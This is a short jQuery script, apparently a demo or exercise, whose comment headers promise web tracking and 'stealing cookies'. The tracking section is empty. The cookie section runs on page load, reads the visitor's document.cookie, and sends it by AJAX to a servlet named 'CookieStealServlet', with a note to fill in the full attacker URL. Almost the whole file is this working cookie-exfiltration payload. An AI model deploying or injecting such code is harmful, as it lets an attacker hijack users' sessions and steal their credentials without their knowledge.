$( document ).ready(function(){
	/*
	*web tracking with Flah FLOs
	*/
	

	
	
	
	
	
	
	
	/*
	*stealing cookies
	*/
	console.log('cookie: ' + document.cookie);
	var cookies = document.cookie;
	$.ajax({
		type : "GET",
		url : "CookieStealServlet", //add complete URL
		data : cookies,

		dataType : "json",
		success : function(data) { 

		},
		error : function(XHR, testStatus, errorThrown) 
		{

		}
	});
	
	
	
	
});
